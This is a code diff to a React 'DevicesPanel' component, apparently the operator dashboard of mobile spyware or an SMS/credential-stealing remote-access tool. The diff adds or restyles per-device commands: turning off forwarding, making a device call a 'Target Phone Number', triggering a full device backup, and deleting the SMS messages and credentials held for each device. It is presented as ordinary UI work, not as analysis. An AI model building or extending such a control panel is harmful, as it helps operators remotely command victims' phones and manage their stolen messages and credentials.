-                        <button className="btn-luxury btn-red" style={{ flex: 1, justifyContent: "center" }} onClick={() => handleCommand("fwd_off", devId)}>
-                          <i className="fas fa-stop"></i> Deactivate
+                        <button 
+                          className="btn-luxury btn-red" 
+                          style={{ justifyContent: "center", padding: "10px" }} 
+                          onClick={() => handleCommand("fwd_off", devId)}
+                        >
+                          <i className="fas fa-stop"></i> Turn OFF Forward
                         </button>
                       </div>
                     </div>
                   )}
 
-                  {/* Commands: Backup */}
-                  {curTab === "backup" && (
-                    <div className="section-premium active">
-                      <div className="section-title">💾 Backup</div>
-                      <button className="btn-luxury btn-purple" style={{ width: "100%", justifyContent: "center" }} onClick={() => handleCommand("backup", devId)}>
-                        <i className="fas fa-database"></i> Trigger Backup
+                  {/* Call Sub-tab */}
+                  {curTab === "call" && (
+                    <div className="section-premium">
+                      <div className="section-title">Make Call Command</div>
+                      <input 
+                        type="text" 
+                        placeholder="Target Phone Number" 
+                        className="search-input" 
+                        style={{ background: "var(--bg-input)", marginBottom: 8, borderRadius: 6, border: "1px solid var(--border-color)" }}
+                        value={formMemory[`callNum-${devId}`] || ""}
+                        onChange={(e) => updateField(`callNum-${devId}`, e.target.value)}
+                      />
+                      <button className="btn-luxury btn-purple" style={{ width: "100%", justifyContent: "center", padding: "10px" }} onClick={() => handleCommand("call", devId)}>
+                        <i className="fas fa-phone"></i> Execute Call
                       </button>
                     </div>
                   )}
 
-                  {/* Delete Panel */}
+                  {/* Backup Sub-tab */}
+                  {curTab === "backup" && (
+                    <div className="section-premium">
+                      <div className="section-title">Device Backup</div>
+                      <button className="btn-luxury btn-purple" style={{ width: "100%", justifyContent: "center", padding: "10px" }} onClick={() => handleCommand("backup", devId)}>
+                        <i className="fas fa-database"></i> Trigger Full Backup
+                      </button>
+                    </div>
+                  )}
+
+                  {/* Delete Sub-tab */}
                   {curTab === "delete" && (
-                    <div className="section-premium active" style={{ borderColor: "var(--red)" }}>
-                      <div className="section-title" style={{ color: "var(--red)" }}>🗑️ Delete Data</div>
-                      <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
+                    <div className="section-premium" style={{ borderColor: "var(--red)" }}>
+                      <div className="section-title" style={{ color: "var(--red)" }}>Danger Zone</div>
+                      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                         <button className="btn-luxury btn-red" style={{ justifyContent: "center" }} onClick={() => deleteDeviceData(devId, "sms")}>
-                          <i className="fas fa-trash"></i> Delete All SMS
+                          Delete SMS
                         </button>
                         <button className="btn-luxury btn-purple" style={{ justifyContent: "center" }} onClick={() => deleteDeviceData(devId, "credentials")}>
-                          <i className="fas fa-trash"></i> Delete All Credentials
+                          Delete Creds
                         </button>
                       </div>
                     </div>
@@ -440,7 +637,7 @@ export default function DevicesPanel({
 
         {offset + DEVICE_LIMIT < keys.length && (
           <button className="btn-load-more" onClick={() => setOffset(offset + DEVICE_LIMIT)}>
-            <i className="fas fa-chevron-down"></i> Load More ({keys.length - (offset + DEVICE_LIMIT)} remaining)
+            <i className="fas fa-chevron-down"></i> Load More Devices ({keys.length - (offset + DEVICE_LIMIT)} remaining)
           </button>
         )}
       </div>
